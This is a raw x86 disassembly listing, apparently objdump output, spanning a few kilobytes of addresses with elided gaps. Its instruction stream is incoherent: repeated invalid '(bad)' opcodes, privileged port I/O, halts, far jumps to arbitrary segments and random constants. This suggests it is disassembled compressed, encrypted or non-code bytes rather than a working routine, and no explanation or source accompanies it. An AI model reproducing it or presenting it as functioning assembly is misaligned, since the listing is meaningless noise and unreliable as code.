  424dc4:	pop    esp
  424dc5:	cmp    DWORD PTR [edi+edx*1-0x4d0ccd49],esp
  424dcc:	dec    ecx
  424dcd:	ret    
  424dce:	jbe    0x424e1b
  424dd0:	mov    esp,0x2aff999
  424dd5:	fisub  WORD PTR [edx]
  424dd7:	mov    esi,0x34c5be74
  424ddc:	imul   esi,DWORD PTR [ecx+0x69],0x6d6fd44a
  424de3:	scas   eax,DWORD PTR es:[edi]
  424de4:	lahf   
  424de5:	xor    al,0x35
  424de7:	mov    ecx,0xd09491a1
  424dec:	cs push eax
  424dee:	mov    ch,0x4e
  424df0:	repnz pop ds
  424df2:	push   edx
  424df3:	idiv   DWORD PTR [ebx-0x5b]
  424df6:	int3   
  424df7:	hlt    
  424df8:	mov    ah,0xfd
  424dfa:	loop   0x424dfa
  424dfc:	jnp    0x424db7
  424dfe:	adc    bl,BYTE PTR [esi+0x4c3334d0]
  424e04:	mov    ebp,0xc4bd4c60
  424e09:	pop    ebx
  424e0a:	fs and al,0x3b
  424e0d:	jl     0x424ddd
  424e0f:	clc    
  424e10:	add    eax,DWORD PTR [eax]
	...
  424e72:	add    BYTE PTR [eax],al
  424e74:	cmp    eax,0xf361d20c
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424e21
  424e81:	scas   al,BYTE PTR es:[edi]
  424e82:	and    BYTE PTR [eiz*2+0x500018a],dh
  424e89:	add    DWORD PTR [eax],eax
  424e8b:	add    BYTE PTR [ebp-0x21c4dd99],al
  424e91:	inc    esi
  424e92:	push   eax
  424e93:	gs shl edi,cl
  424e96:	jmp    0x6950:0x4de0b397
  424e9d:	mov    esp,0x29f3f94d
  424ea2:	ds add al,0xf0
  424ea5:	sbb    eax,0xaa75cf51
  424eaa:	add    DWORD PTR [ecx],esi
  424eac:	dec    esp
  424ead:	es xor eax,0x176a7a05
  424eb3:	out    0x26,eax
  424eb5:	daa    
  424eb6:	mov    ebx,0x8af81968
  424ebb:	imul   eax,DWORD PTR [ebx],0xffffff9d
  424ebe:	mov    BYTE PTR [ecx-0x49],bh
  424ec1:	sub    DWORD PTR [edx],edx
  424ec3:	pop    ds
  424ec4:	out    0x10,al
  424ec6:	ret    0x5c6c
  424ec9:	inc    edx
  424eca:	scas   al,BYTE PTR es:[edi]
  424ecb:	pop    ss
  424ecc:	xchg   DWORD PTR [ecx+0x42b39c0e],esp
  424ed2:	test   al,0xf0
  424ed4:	jbe    0x424f1a
  424ed6:	out    dx,eax
  424ed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ed8:	call   0x2a4fa176
  424edd:	lahf   
  424ede:	dec    eax
  424edf:	mov    ebx,0x1dd9dc2f
  424ee4:	test   DWORD PTR [edx-0x34b9d0e0],0x150dfed3
  424eee:	mov    ebx,0x445cd876
  424ef3:	stc    
  424ef4:	scas   al,BYTE PTR es:[edi]
  424ef5:	cdq    
  424ef6:	push   es
  424ef7:	jecxz  0x424f75
  424ef9:	and    al,0xf
  424efb:	mov    ebx,0x35b75d16
  424f00:	add    al,0xcd
  424f02:	in     eax,0xe0
  424f04:	dec    esp
  424f05:	or     al,0x56
  424f07:	mov    ds:0xa3296c2c,eax
  424f0c:	sbb    BYTE PTR [edx+0x4],ah
  424f0f:	mov    ds:0x67e67249,eax
  424f14:	in     al,0xb0
  424f16:	fucomp st(1)
  424f18:	sti    
  424f19:	cmp    ebx,ebx
  424f1b:	pop    edx
  424f1c:	jbe    0x424eee
  424f1e:	adc    eax,0xa65b3862
  424f23:	xchg   esp,eax
  424f24:	sub    BYTE PTR [si],0xea
  424f28:	push   ebp
  424f29:	mov    dl,0x0
  424f2b:	cmc    
  424f2c:	clc    
  424f2d:	gs neg edx
  424f30:	in     al,dx
  424f31:	xchg   ebp,eax
  424f32:	cld    
  424f33:	push   ebx
  424f34:	ds inc ecx
  424f36:	in     al,0x6e
  424f38:	cwde   
  424f39:	shr    esi,1
  424f3b:	mov    edi,ebp
  424f3d:	and    eax,DWORD PTR [ebp+0x5ceabfde]
  424f43:	das    
  424f44:	mov    bl,0xc6
  424f46:	add    eax,0x202a6a12
  424f4b:	mov    ds:0xe587b2fe,al
  424f50:	adc    ebx,DWORD PTR [eax+0x64ab7a4a]
  424f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f57:	test   BYTE PTR [ebx],0xf4
  424f5a:	mov    edi,0x4fc85113
  424f5f:	js     0x424f07
  424f61:	inc    esi
  424f62:	add    eax,0x94472756
  424f67:	pop    ecx
  424f68:	mov    ecx,DWORD PTR [eax]
  424f6a:	bound  edi,QWORD PTR [ecx]
  424f6c:	mov    al,0x43
  424f6e:	out    dx,eax
  424f6f:	popf   
  424f70:	lods   al,BYTE PTR ds:[esi]
  424f71:	(bad)  
  424f72:	pop    edx
  424f73:	fwait
  424f74:	std    
  424f75:	mov    esi,edx
  424f77:	cli    
  424f78:	add    BYTE PTR [ecx],bh
  424f7a:	jg     0x424ff0
  424f7c:	and    bl,bl
  424f7e:	or     al,0xb0
  424f80:	call   0x362e:0x950057be
  424f87:	test   DWORD PTR [eax+0x63c7b694],esp
  424f8d:	cmp    bh,BYTE PTR [ebx]
  424f8f:	or     eax,0x1c
	...
  424ff4:	dec    ebx
  424ff5:	push   ss
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	fisttp QWORD PTR gs:[ebx+0x60]
  425004:	push   0xffffff8b
  425006:	add    DWORD PTR [eax],eax
  425008:	add    eax,0x11000001
  42500d:	xchg   DWORD PTR [edi],ecx
  42500f:	aad    0x34
  425011:	fimul  DWORD PTR [ebx+eiz*2]
  425014:	(bad)  
  425015:	xor    dh,bh
  425017:	pop    ebp
  425018:	cdq    
  425019:	push   0xcec650f5
  42501e:	mov    ds:0xe8cda46b,eax
  425023:	add    ebx,DWORD PTR [esi+eiz*2+0x57a5f307]
  42502a:	outs   dx,BYTE PTR ds:[esi]
  42502b:	adc    bl,bl
  42502d:	test   al,0x6f
  42502f:	and    eax,0x3f1cf5e6
  425034:	pusha  
  425035:	daa    
  425036:	xchg   BYTE PTR [ebp+0xf],cl
  425039:	dec    edi
  42503a:	jmp    0x424fd7
  42503c:	mov    dl,0x15
  42503e:	dec    ebx
  42503f:	mov    ebx,0xfcf550f7
  425044:	sbb    al,0xfa
  425046:	call   0x1792aa9e
  42504b:	sbb    BYTE PTR [ebx+0x4eaf5153],al
  425051:	dec    edi
  425052:	mov    DWORD PTR [ecx+0x17],eax
  425055:	call   DWORD PTR [ecx]
  425057:	pusha  
  425058:	sub    dh,BYTE PTR cs:[edx+eiz*2-0x47922a02]
  425060:	xor    BYTE PTR [ebx],al
  425062:	dec    esi
  425063:	jmp    0xdfdf:0xa7f896d0
  42506a:	and    eax,0xd7ea31ad
  42506f:	sub    BYTE PTR [ecx],bl
  425071:	ins    BYTE PTR es:[edi],dx
  425072:	jmp    0x42507c
  425074:	mov    edx,0x2c0b2f5d
  425079:	sub    BYTE PTR [ebx+0x3f785dce],bl
  42507f:	xor    eax,0x6847497b
  425084:	push   0xffffffbd
  425086:	mov    ds:0x4809660e,al
  42508b:	inc    ebx
  42508c:	cmp    BYTE PTR ds:0xaeb5feb6,ch
  425092:	repz xlat BYTE PTR ds:[ebx]
  425094:	mov    ecx,0x554e8a50
  425099:	frstor [edi-0x45]
  42509c:	fisubr WORD PTR [ebx]
  42509e:	(bad)  
  42509f:	pop    ebx
  4250a0:	dec    ebx
  4250a1:	dec    esi
  4250a2:	adc    eax,DWORD PTR [esi-0x10]
  4250a5:	adc    al,0xb4
  4250a7:	mov    esi,fs
  4250a9:	mov    ecx,0xcf2b0f9e
  4250ae:	into   
  4250af:	iret   
  4250b0:	mov    DWORD PTR [esi-0x1ce9b79a],ebp
  4250b6:	adc    al,0xdf
  4250b8:	jle    0x42510f
  4250ba:	cli    
  4250bb:	push   es
  4250bc:	jmp    0x711bb427
  4250c1:	fistp  WORD PTR [edi-0x8abbbfa]
  4250c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250c8:	adc    DWORD PTR [esi-0x55],esi
  4250cb:	add    DWORD PTR [ebx+edx*8],0x2b
  4250cf:	ja     0x42513b
  4250d1:	into   
  4250d2:	inc    esi
  4250d3:	pop    ss
  4250d4:	es das 
  4250d6:	out    0x6b,eax
  4250d8:	jns    0x425147
  4250da:	cmc    
  4250db:	cmp    al,0x29
  4250dd:	stos   DWORD PTR es:[edi],eax
  4250de:	mov    ch,BYTE PTR [ebp-0x32]
  4250e1:	or     al,0x82
  4250e3:	push   esi
  4250e4:	in     eax,dx
  4250e5:	js     0x4250f1
  4250e7:	hlt    
  4250e8:	mov    ?,WORD PTR [ebx+0x7880c7cb]
  4250ee:	aaa    
  4250ef:	push   edx
  4250f0:	mov    dl,0x30
  4250f2:	cmp    al,0x70
  4250f4:	loop   0x4250d9
  4250f6:	pop    eax
  4250f7:	cmp    ebx,eax
  4250f9:	sbb    ah,dh
  4250fb:	mov    ebx,0xee5f9384
  425100:	mov    dl,0x47
  425102:	pand   mm4,QWORD PTR [ecx+0x69]
  425106:	icebp  
  425107:	stos   BYTE PTR es:[edi],al
  425108:	mov    edx,0x77fc53b8
  42510d:	ret    0x974b
  425110:	pushf  
	...
  425171:	add    BYTE PTR [eax],al
  425173:	add    dh,bl
  425175:	adc    DWORD PTR [edi-0x15020dd],ebx
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0xe047:0xcb3692e8
  425184:	outs   dx,DWORD PTR ds:[esi]
  425185:	mov    WORD PTR [ecx],es
  425187:	add    BYTE PTR ds:0xb4000001,al
  42518d:	sbb    DWORD PTR [ebx+edi*1+0x78],0x3dafbfa0
  425195:	fcmovbe st,st(5)
  425197:	mov    al,0x5f
  425199:	add    esp,esp
  42519b:	jp     0x425127
  42519d:	into   
  42519e:	jge    0x42520a
  4251a0:	xor    BYTE PTR [ebx+edi*8],cl
  4251a3:	lds    ecx,FWORD PTR [eax]
  4251a5:	add    eax,0x56c27db2
  4251aa:	in     al,dx
  4251ab:	hlt    
  4251ac:	mov    eax,0x6e0a1d6c
  4251b1:	xor    BYTE PTR [edi],bh
  4251b3:	nop
  4251b4:	loopne 0x4251c1
  4251b6:	sub    BYTE PTR [ebx],dl
  4251b8:	lock mov WORD PTR [eax+0x51a2cf6b],ds
  4251bf:	(bad)  
  4251c0:	mov    ds:0xe01b7383,eax
  4251c5:	inc    eax
  4251c6:	ds icebp 
  4251c8:	dec    ebp
  4251c9:	cdq    
  4251ca:	and    eax,0xc32ca851
  4251cf:	or     DWORD PTR [edi-0x24],0x14
  4251d3:	je     0x425205
  4251d5:	adc    BYTE PTR [edx-0x7643acd],ch
  4251db:	outs   dx,BYTE PTR ds:[esi]
  4251dc:	fcomp  DWORD PTR [esi+eax*1+0x64f7e961]
  4251e3:	mov    al,0x77
  4251e5:	jbe    0x4251ca
  4251e7:	xchg   esi,eax
  4251e8:	xchg   esi,eax
  4251e9:	rcr    BYTE PTR [ebx-0x5a],0x53
  4251ed:	cs aam 0x42
  4251f0:	out    dx,eax
  4251f1:	jmp    0x1f99d17e
  4251f6:	push   cs
  4251f7:	cmp    al,0x91
  4251f9:	add    al,0x85
  4251fb:	jb     0x4251aa
  4251fd:	aas    
  4251fe:	inc    ebx
  4251ff:	adc    al,0xee
  425201:	fs pop ecx
  425203:	shl    BYTE PTR [edi],cl
  425205:	rol    ecx,cl
  425207:	stc    
  425208:	jge    0x425250
  42520a:	dec    ebp
  42520b:	push   ebp
  42520c:	pop    ss
  42520d:	pop    edx
  42520e:	add    BYTE PTR [ecx],0x6b
  425211:	das    
  425212:	inc    ebp
  425213:	jmp    0x42527d
  425215:	loopne 0x4251ad
  425217:	div    DWORD PTR [ebx-0x587255f0]
  42521d:	ja     0x3f909a08
  425223:	hlt    
  425224:	adc    DWORD PTR [ebx],esp
  425226:	push   edx
  425227:	pop    edi
  425228:	mov    esi,ecx
  42522a:	out    0x44,eax
  42522c:	mov    dl,BYTE PTR [esi+0xd2e072]
  425232:	add    DWORD PTR [edx+eax*2+0x7d],edi
  425236:	sbb    DWORD PTR [ecx],edx
  425238:	sbb    BYTE PTR [ebx],dh
  42523a:	cmc    
  42523b:	or     cl,BYTE PTR [edx]
  42523d:	sub    al,0x42
  42523f:	jns    0x425215
  425241:	xchg   ecx,eax
  425242:	cmc    
  425243:	ins    DWORD PTR es:[edi],dx
  425244:	adc    al,0x3e
  425246:	push   esp
  425247:	mov    ds:0x845ebbab,al
  42524c:	fisttp DWORD PTR [esi-0x78]
  42524f:	inc    edi
  425250:	dec    edi
  425251:	fst    QWORD PTR [esp+ecx*1-0x770094cc]
  425258:	cmp    ebx,esi
  42525a:	lods   al,BYTE PTR ds:[esi]
  42525b:	mov    bl,0xdb
  42525d:	test   BYTE PTR [ecx],bl
  42525f:	call   0xa66b9b52
  425264:	ret    0x9090
  425267:	push   edx
  425268:	cdq    
  425269:	cmp    DWORD PTR [ecx],ebp
  42526b:	outs   dx,BYTE PTR ds:[esi]
  42526c:	or     BYTE PTR [esi-0x23bdd8a3],al
  425272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425273:	xlat   BYTE PTR ds:[ebx]
  425274:	or     DWORD PTR [esi-0x5e],0x263c42b5
  42527b:	xor    ecx,DWORD PTR [edi]
  42527d:	arpl   WORD PTR [esp+ecx*1+0x20],sp
  425281:	mov    esp,0x2bf69b51
  425286:	ss adc ah,bh
  425289:	xchg   edx,eax
  42528a:	call   0x8528:0x914cffbd
	...
  4252f1:	add    BYTE PTR [eax],al
  4252f3:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	fs (bad) 
  425302:	or     ebx,DWORD PTR [ebx+0x74]
  425305:	lea    eax,[ecx]
  425307:	add    BYTE PTR ds:0x46000001,al
  42530d:	mov    al,0x63
  42530f:	ins    DWORD PTR es:[edi],dx
  425310:	sub    DWORD PTR [edx],0x57
  425313:	inc    ebp
  425314:	stc    
  425315:	ins    BYTE PTR es:[edi],dx
  425316:	test   ecx,esi
  425318:	gs dec edx
  42531a:	add    al,BYTE PTR [eax]
  42531c:	dec    ecx
  42531d:	in     eax,dx
  42531e:	arpl   WORD PTR [esp+edx*8-0x7e],bx
  425322:	neg    ebp
  425324:	mov    al,ds:0x72f4f5e8
  425329:	sub    al,0x5a
  42532b:	xchg   esi,eax
  42532c:	pop    es
  42532d:	sub    ebx,esp
  42532f:	in     al,dx
  425330:	loop   0x4252e7
  425332:	clc    
  425333:	mov    edi,0x5b4ef117
  425338:	enter  0xcec9,0x58
  42533c:	loope  0x425393
  42533e:	push   0xffffffc3
  425340:	jecxz  0x425383
  425342:	pushf  
  425343:	xor    ah,BYTE PTR [ebx+ebp*8+0x3f3e728c]
  42534a:	fild   DWORD PTR [ebx+0x3b3d07e6]
  425350:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425351:	or     al,0x71
  425353:	stos   BYTE PTR es:[edi],al
  425354:	sub    bl,bh
  425356:	cmp    BYTE PTR ds:[ebx+0x9d11c65],al
  42535d:	bswap  ecx
  42535f:	nop
  425360:	std    
  425361:	leave  
  425362:	out    dx,al
  425363:	test   bh,dh
  425365:	cmp    esp,esi
  425367:	(bad)
  42536a:	jmp    0x5023:0x856e37f8
  425371:	(bad)  
  425372:	fcom   QWORD PTR [ebx]
  425374:	push   esi
  425375:	(bad)  
  425376:	cmp    eax,DWORD PTR [ecx]
  425378:	daa    
  425379:	push   es
  42537a:	xor    ebp,DWORD PTR [ebp+0x27]
  42537d:	push   0x9ccf288b
  425382:	xor    cl,BYTE PTR [edi-0x6ed99281]
  425388:	inc    ecx
  425389:	popa   
  42538a:	retf   
  42538b:	pusha  
  42538c:	mov    bh,0x42
  42538e:	sub    BYTE PTR [edi-0x73],bl
  425391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425392:	push   ebx
  425393:	cmp    DWORD PTR [edx+ecx*2-0x55502f54],0x165e571d
  42539e:	inc    ebp
  42539f:	jmp    0x4253b2
  4253a1:	mov    ds:0x1b889f78,eax
  4253a6:	mov    ds:0x58fdd77a,al
  4253ab:	add    dh,ah
  4253ad:	jns    0x425416
  4253af:	ss jl  0x425407
  4253b2:	mov    ds,esi
  4253b4:	jg     0x42539c
  4253b6:	fidiv  WORD PTR [edi-0x3a1c5142]
  4253bc:	inc    ebp
  4253bd:	xchg   ebx,eax
  4253be:	add    DWORD PTR [ebx-0x67c5613],edx
  4253c4:	or     DWORD PTR [esi],0x25
  4253c7:	xor    edx,ebp
  4253c9:	out    dx,eax
  4253ca:	or     esp,DWORD PTR [edx+0x39]
  4253cd:	xchg   esi,edx
  4253cf:	pop    esp
  4253d0:	and    eax,0xa7585c11
  4253d5:	jns    0x42535c
  4253d7:	jbe    0x425411
  4253d9:	dec    edi
  4253da:	sbb    BYTE PTR [eax-0x7bd733f2],bh
  4253e0:	(bad)  
  4253e1:	mov    esp,0x59ee7a3f
  4253e6:	addr16 mov cl,0x15
  4253e9:	imul   edx,DWORD PTR [ebp+0x9],0xe50c1b5e
  4253f0:	in     eax,dx
  4253f1:	enter  0x4191,0x48
  4253f5:	push   cs
  4253f6:	add    DWORD PTR [ebx-0x75],ebp
  4253f9:	sub    al,0x16
  4253fb:	cmp    al,BYTE PTR [ebx-0x6cd3c15d]
  425401:	or     ebx,DWORD PTR [ebx-0x43]
  425404:	(bad)  
  425405:	repz inc ecx
  425407:	ja     0x4253cc
  425409:	mov    al,ds:0x8f411f9e
  42540e:	sbb    DWORD PTR [ecx+ecx*8+0x0],ecx
	...
  425472:	add    BYTE PTR [eax],al
  425474:	inc    edx
  425475:	or     esp,eax
  425477:	test   eax,0xeb6fedcf
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    ebx,DWORD PTR [eax+edi*8+0x71]
  425483:	dec    esp
  425484:	jns    0x425414
  425486:	add    DWORD PTR [eax],eax
  425488:	add    eax,0x54000001
  42548d:	jbe    0x42549c
  42548f:	test   BYTE PTR [ebx-0x51684b3a],al
  425495:	inc    ebx
  425496:	push   eax
  425497:	sbb    edi,DWORD PTR [edi-0x26]
  42549a:	sub    DWORD PTR [edx+0x1],0x72906c7
  4254a1:	test   DWORD PTR [edi],0x64c7d3d6
  4254a7:	and    al,0x57
  4254a9:	dec    esp
  4254aa:	add    ecx,DWORD PTR [edx+eiz*4+0x60]
  4254ae:	push   esp
  4254af:	mov    edx,0x13fbe4b
  4254b4:	dec    esp
  4254b5:	(bad)  
  4254b7:	repz bound esp,QWORD PTR [esp+esi*4]
  4254bb:	sti    
  4254bc:	mov    ds,WORD PTR cs:[esi+eiz*2+0x8]
  4254c1:	pop    di
  4254c3:	sbb    ch,BYTE PTR [ebx+esi*2-0x1d6d05a8]
  4254ca:	adc    DWORD PTR [ebx],ecx
  4254cc:	xchg   ecx,eax
  4254cd:	retf   
  4254ce:	xchg   ecx,eax
  4254cf:	lods   eax,DWORD PTR ds:[esi]
  4254d0:	jmp    0x2c60459a
  4254d5:	cmp    al,0xa9
  4254d7:	ret    0x9ace
  4254da:	mov    ds:0xafa86442,eax
  4254df:	sub    al,0x1b
  4254e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4254e2:	jecxz  0x42553c
  4254e4:	outs   dx,BYTE PTR ds:[esi]
  4254e5:	jb     0x4254d4
  4254e7:	arpl   WORD PTR [ebp+0x66],di
  4254ea:	push   esi
  4254eb:	jle    0x4254af
  4254ed:	arpl   WORD PTR [ecx-0x60],bx
  4254f0:	and    ecx,DWORD PTR [esi+ebx*2+0x24]
  4254f4:	or     DWORD PTR [ebx+esi*8],0xffffff86
  4254f8:	stos   BYTE PTR es:[edi],al
  4254f9:	push   esi
  4254fa:	pop    esi
  4254fb:	dec    eax
  4254fc:	pop    edx
  4254fd:	ss mov al,0xf1
  425500:	popf   
  425501:	push   ecx
  425502:	fld    DWORD PTR [esi]
  425504:	ror    bl,0x65
  425507:	xchg   ecx,eax
  425508:	ja     0x42554a
  42550a:	mov    bh,0x9c
  42550c:	loop   0x4254a9
  42550e:	mov    eax,0xb32408f
  425513:	ja     0x425581
  425515:	mov    esp,0x7753bcd5
  42551a:	jb     0x4254b5
  42551c:	popf   
  42551d:	idiv   al
  42551f:	sar    bl,0xd0
  425522:	inc    edx
  425523:	mov    DWORD PTR ds:0x60a15e2e,eax
  425529:	ret    
  42552a:	out    dx,al
  42552b:	inc    ecx
  42552c:	arpl   WORD PTR [ebx+0x72],di
  42552f:	ret    
  425530:	in     eax,0x98
  425532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425533:	dec    edi
  425534:	int    0x9f
  425536:	add    BYTE PTR [edi],dl
  425538:	(bad)  
  425539:	jg     0x42555b
  42553b:	mov    ebx,0xeeda9766
  425540:	mov    esp,0x2c5ad7db
  425545:	mov    esi,0x3818775d
  42554a:	pop    ds
  42554b:	and    eax,0x6eb8c5a4
  425550:	push   ecx
  425551:	je     0x4254df
  425553:	ror    BYTE PTR [edi+0x45bb2150],cl
  425559:	and    DWORD PTR [ecx-0xd52c9a7],0xf3736e83
  425563:	mov    ecx,0x1d204f88
  425568:	lds    ebx,FWORD PTR [eax]
  42556a:	sbb    BYTE PTR ds:0x38ebd73e,dl
  425570:	in     eax,dx
  425571:	outs   dx,DWORD PTR ds:[esi]
  425572:	jno    0x4255c9
  425574:	lods   al,BYTE PTR ds:[esi]
  425575:	mov    DWORD PTR [ebp-0x4825420a],esp
  42557b:	lock jb 0x4255f9
  42557e:	ror    DWORD PTR [ecx+0x613d88a9],1
  425584:	rol    DWORD PTR [edx-0x4a],1
  425587:	xchg   edi,eax
  425588:	inc    edx
  425589:	pusha  
  42558a:	test   bl,dh
  42558c:	je     0x42553b
  42558e:	out    dx,al
  42558f:	mov    bl,BYTE PTR [ecx+0x0]
	...
  4255f2:	add    BYTE PTR [eax],al
  4255f4:	(bad)  
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0xe51ef13a
  425602:	add    esp,edx
  425604:	jle    0x425595
  425606:	add    DWORD PTR [eax],eax
  425608:	add    eax,0xe8000001
  42560d:	cwde   
  42560e:	jle    0x425594
  425610:	cmp    BYTE PTR ds:0x4d40e8a8,ch
  425616:	xlat   BYTE PTR ds:[ebx]
  425617:	test   eax,0xec78d394
  42561c:	mov    ds:0xc35d2cea,eax
  425621:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425622:	popa   
  425623:	imul   esi,DWORD PTR [ebp-0x4436d184],0xc52e1ff5
  42562d:	pop    ecx
  42562e:	mov    bh,0x87
  425630:	pop    ecx
  425631:	jbe    0x425625
  425633:	push   edx
  425634:	stos   BYTE PTR es:[edi],al
  425635:	ins    BYTE PTR es:[edi],dx
  425636:	mov    dl,0x69
  425638:	jns    0x4255c1
  42563a:	push   ecx
  42563b:	dec    ebx
  42563c:	es inc ebp
  42563e:	pop    ebx
  42563f:	cmp    esp,esi
  425641:	pcmpeqw mm1,mm6
  425644:	stc    
  425645:	inc    eax
  425646:	popf   
  425647:	mov    cl,0x76
  425649:	fwait
  42564a:	mov    cl,0xa8
  42564c:	dec    ebp
  42564d:	sub    DWORD PTR [ebx+0x53],ecx
  425650:	jl     0x42561b
  425652:	ret    
  425653:	jo     0x4255ed
  425655:	pop    ss
  425656:	nop
  425657:	pop    es
  425658:	jns    0x425667
  42565a:	addr16 iret 
  42565c:	adc    edx,ebp
  42565e:	sti    
  42565f:	dec    ebp
  425660:	dec    esp
  425661:	mov    cl,0x68
  425663:	pop    edi
  425664:	or     BYTE PTR [ebx],0xe3
  425667:	fld    QWORD PTR [edx+eax*8+0x53]
  42566b:	xor    BYTE PTR [esi-0x30],dh
  42566e:	cmp    DWORD PTR [esi-0x3dbfcb33],0xd7e133a9
  425678:	dec    ebp
  425679:	dec    edi
  42567a:	out    dx,al
  42567b:	sahf   
  42567c:	cmp    BYTE PTR [edx+edx*4],al
  42567f:	es out 0xd8,eax
  425682:	(bad)
  425686:	inc    edi
  425687:	cmp    BYTE PTR [eax-0x31],0x0
  42568b:	add    dl,BYTE PTR ds:0xba216571
  425691:	mov    ebp,0xa974d01b
  425696:	mov    al,ds:0x3fdd3d57
  42569b:	aam    0x57
  42569d:	sub    eax,0x76b5871
  4256a2:	(bad)  
  4256a3:	imul   DWORD PTR [edx]
  4256a5:	push   eax
  4256a6:	sub    DWORD PTR [esi+ecx*4+0x50],edx
  4256aa:	sbb    eax,0xf0cedc2b
  4256af:	push   ss
  4256b0:	adc    esi,0x8beec80d
  4256b6:	dec    eax
  4256b7:	jne    0x4256b4
  4256b9:	mov    bh,BYTE PTR [edi]
  4256bb:	cmp    DWORD PTR [esi-0x72],ecx
  4256be:	add    DWORD PTR [esi-0x6b],ebx
  4256c1:	test   al,0x1f
  4256c3:	into   
  4256c4:	lds    eax,FWORD PTR [ecx]
  4256c6:	adc    eax,0x533271be
  4256cb:	imul   eax,esp,0x2b3fc6b8
  4256d1:	pop    eax
  4256d2:	(bad)  [ecx+0x7c]
  4256d5:	clc    
  4256d6:	dec    ebx
  4256d7:	call   0x7ad3c91f
  4256dc:	mov    eax,0x299e0d4
  4256e1:	mov    ah,0x6c
  4256e3:	mov    gs,WORD PTR [esi+0x7]
  4256e6:	jge    0x4256ed
  4256e8:	sub    esp,DWORD PTR [edi]
  4256ea:	sbb    eax,DWORD PTR [ecx+eiz*2+0x16]
  4256ee:	les    ecx,FWORD PTR [edi]
  4256f0:	pop    ds
  4256f1:	outs   dx,BYTE PTR ds:[esi]
  4256f2:	xor    eax,0x1bf73334
  4256f7:	pop    ss
  4256f8:	loope  0x42570e
  4256fa:	inc    esp
  4256fb:	dec    esi
  4256fc:	mov    eax,ds:0x5d0ed9fb
  425701:	daa    
  425702:	adc    ecx,DWORD PTR [ebp+edx*2+0x2c]
  425706:	fwait
  425707:	imul   esi,DWORD PTR [ebp+eax*1-0xb30ea1e],0xf10ca8
	...
  425772:	add    BYTE PTR [eax],al
  425774:	(bad)  
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0xd0646274
  425783:	mov    esi,0x19083
  425788:	add    eax,0xf3000001
  42578d:	je     0x425717
  42578f:	cli    
  425790:	mov    eax,ds:0x3e9dc993
  425795:	aad    0x79
  425797:	push   ebp
  425798:	outs   dx,BYTE PTR ds:[esi]
  425799:	(bad)  
  42579a:	cdq    
  42579b:	xchg   esp,eax
  42579c:	js     0x4257b9
  42579e:	outs   dx,DWORD PTR ds:[esi]
  42579f:	inc    edi
  4257a0:	iret   
  4257a1:	mov    WORD PTR [ebx],gs
  4257a3:	(bad)  
  4257a4:	jmp    0xfaa3:0x587f7472
  4257ab:	retf   0xfb08
  4257ae:	inc    ebp
  4257af:	sahf   
  4257b0:	and    DWORD PTR [ebx+0x41],ebp
  4257b3:	ds push ds
  4257b5:	js     0x425816
  4257b7:	xor    ch,BYTE PTR [eax-0x5]
  4257ba:	cmp    dh,BYTE PTR [edx-0x3d8e98d8]
  4257c0:	push   esi
  4257c1:	push   es
  4257c2:	out    0xf8,eax
  4257c4:	xchg   edx,eax
  4257c5:	(bad)  
  4257c6:	loop   0x42579a
  4257c8:	adc    DWORD PTR ds:0x9e523d29,ecx
  4257ce:	xchg   esp,eax
  4257cf:	xorps  xmm0,XMMWORD PTR ss:[eax]
  4257d3:	sub    BYTE PTR [esi+0x6cb26959],bh
  4257d9:	mov    eax,0xe0b987f4
  4257de:	in     eax,dx
  4257df:	arpl   WORD PTR [edi+0x41a981f8],dx
  4257e5:	scas   al,BYTE PTR es:[edi]
  4257e6:	jmp    0x38b6:0x9dd277ce
  4257ed:	sbb    esp,0xffffff8a
  4257f0:	sbb    eax,0xc268f260
  4257f5:	or     eax,0x265c8d55
  4257fa:	iret   
  4257fb:	shr    BYTE PTR [ebx-0x5db999bb],1
  425801:	inc    esp
  425802:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425803:	mov    edi,0x51ab1b27
  425808:	into   
  425809:	sub    edi,0xfffffff2
  42580c:	int3   
  42580d:	ret    
  42580e:	retf   0x86d5
  425811:	sub    cl,BYTE PTR [esi+0x10f8aa59]
  425817:	ret    
  425818:	ret    
  425819:	out    dx,al
  42581a:	mov    BYTE PTR [eax-0x7b],dh
  42581d:	test   BYTE PTR [ecx-0x5fb5d6d5],dh
  425823:	ds adc eax,0x6f208586
  425829:	adc    al,bl
  42582b:	ds mov ah,0x45
  42582e:	and    ebp,DWORD PTR [eax+ecx*4-0x3bdd961a]
  425835:	mov    esi,0x377fe1fc
  42583a:	sbb    eax,DWORD PTR [ecx]
  42583c:	mov    DWORD PTR [ebx],esi
  42583e:	sbb    eax,0x82efd8bc
  425843:	frstor [ecx]
  425845:	pusha  
  425846:	mov    dl,BYTE PTR [edx-0x2f8d0c65]
  42584c:	mov    eax,0xd6ce211d
  425851:	mov    DWORD PTR [ebx],ebp
  425853:	jno    0x42580c
  425855:	stos   DWORD PTR es:[edi],eax
  425856:	test   DWORD PTR [edx],esp
  425858:	cmp    al,0xd7
  42585a:	adc    esi,DWORD PTR [ebp-0x6b]
  42585d:	pop    ds
  42585e:	and    cl,BYTE PTR [eax+0x107e2557]
  425864:	inc    ebp
  425865:	(bad)  
  425866:	idiv   DWORD PTR [eax-0x4a2b0b74]
  42586c:	fs mov dl,0x20
  42586f:	lock add cl,ah
